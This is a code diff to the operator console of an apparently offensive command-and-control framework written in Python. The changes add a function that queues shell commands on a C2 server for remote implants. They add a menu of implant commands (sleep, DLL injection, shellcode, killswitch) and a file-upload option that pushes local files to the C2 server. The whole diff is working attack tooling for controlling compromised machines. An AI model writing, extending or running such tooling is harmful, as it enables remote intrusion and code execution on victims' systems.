@@ -36,8 +36,28 @@ def upload_file(localpath, filename):
     dfiles.close()
     r = requests.post(f"{c2_server}{filepath}{filename}", json=[{"file_contents":data}])
 
+def shell_command(shellcommand, agent_id):
+    r = requests.post(f"{c2_server}/shell", json=[{"shellcommand": shellcommand}])
+    if r.text == "True":
+        print("queued ")
+    else:
+        print("failed")
+
+
+"""  
+implant commands    
+0 = sleep
+1 = dllinjection
+2 = shellcode
+3 = killswitch
+"""
+
 
 if __name__ == "__main__":
+    print("0 = sleep \n\
+          1 = dllinjection \n\
+          2 = shellcode \n\
+          3 = killswitch\n")
     while True:
         cmd = input(">>")
         if cmd == "q":
@@ -46,7 +66,10 @@ if __name__ == "__main__":
             print_implants()
         elif "sid" in cmd:
             implant_id = cmd.split(" ")[1]
-
+        elif cmd == 'u':
+            localpath = input("enter file path>>>")
+            filename = input("enter file name>>>")
+            upload_file(localpath, filename)
         elif cmd == "\n":
             continue
         else:
